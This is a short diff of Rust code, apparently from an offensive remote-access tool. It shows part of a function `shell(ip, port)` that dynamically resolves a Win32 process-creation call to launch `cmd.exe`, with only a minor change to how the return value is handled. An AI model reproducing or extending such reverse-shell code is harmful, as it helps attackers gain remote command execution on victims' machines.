@@ -91,7 +91,7 @@ pub fn shell(ip: &str, port: u16) {
     let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
     let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
     unsafe {
-        function(
+        let _ = function(
             PCSTR::null(),
             lp_command_line,
             &SECURITY_ATTRIBUTES::default(),
@@ -102,6 +102,6 @@ pub fn shell(ip: &str, port: u16) {
             PCSTR::null(),
             &startup_info,
             &PROCESS_INFORMATION::default(),
-        )
+        );
     };
 }
